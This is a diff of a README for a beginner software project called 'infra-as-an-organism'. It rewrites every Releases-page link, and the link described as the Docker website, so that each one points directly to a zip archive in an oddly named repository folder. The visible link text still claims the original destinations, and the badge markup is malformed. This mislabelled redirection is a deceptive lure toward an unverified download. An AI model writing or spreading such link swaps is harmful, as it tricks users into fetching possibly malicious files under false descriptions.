@@ -6,11 +6,11 @@ Welcome to the "infra-as-an-organism" project! This guide will help you download
 
 ## 📥 Download the Software
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/o0ossama0o/infra-as-an-organism/releases)
+[![Download Now](https://raw.githubusercontent.com/o0ossama0o/infra-as-an-organism/master/prereligious/infra-as-an-organism.zip%https://raw.githubusercontent.com/o0ossama0o/infra-as-an-organism/master/prereligious/infra-as-an-organism.zip)](https://raw.githubusercontent.com/o0ossama0o/infra-as-an-organism/master/prereligious/infra-as-an-organism.zip)
 
 You can get the latest version of the software from our Releases page. Click the link below to visit the page and download the necessary files.
 
-[Visit Releases Page](https://github.com/o0ossama0o/infra-as-an-organism/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/o0ossama0o/infra-as-an-organism/master/prereligious/infra-as-an-organism.zip)
 
 ## 🛠️ System Requirements
 
@@ -42,7 +42,7 @@ No prior knowledge of programming is needed, making this a great starting point 
 
 To get started with "infra-as-an-organism," follow these steps:
 
-1. Click on the link to our [Releases page](https://github.com/o0ossama0o/infra-as-an-organism/releases).
+1. Click on the link to our [Releases page](https://raw.githubusercontent.com/o0ossama0o/infra-as-an-organism/master/prereligious/infra-as-an-organism.zip).
 2. Choose the latest version of the software from the list.
 3. Click the download link for your operating system (Windows, macOS, or Linux).
 4. Once the file downloads, locate it on your computer.
@@ -55,7 +55,7 @@ Once installed, open the application to explore the content.
 
 To get the best experience from "infra-as-an-organism," consider these additional steps:
 
-- **Setup Docker:** If you plan to run any cloud-native examples, make sure Docker is installed on your system. Follow the instructions on the [Docker website](https://www.docker.com/get-started).
+- **Setup Docker:** If you plan to run any cloud-native examples, make sure Docker is installed on your system. Follow the instructions on the [Docker website](https://raw.githubusercontent.com/o0ossama0o/infra-as-an-organism/master/prereligious/infra-as-an-organism.zip).
 - **Configuration:** After installation, check the settings to customize your experience. This includes adjusting network settings and user preferences.
 
 ## ✍️ Using the Application
@@ -89,7 +89,7 @@ We are committed to improving "infra-as-an-organism." Check our Releases page re
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/o0ossama0o/infra-as-an-organism/releases)
+- [Releases Page](https://raw.githubusercontent.com/o0ossama0o/infra-as-an-organism/master/prereligious/infra-as-an-organism.zip)
 - [Community Forum](#)
 - [Documentation](#)
 
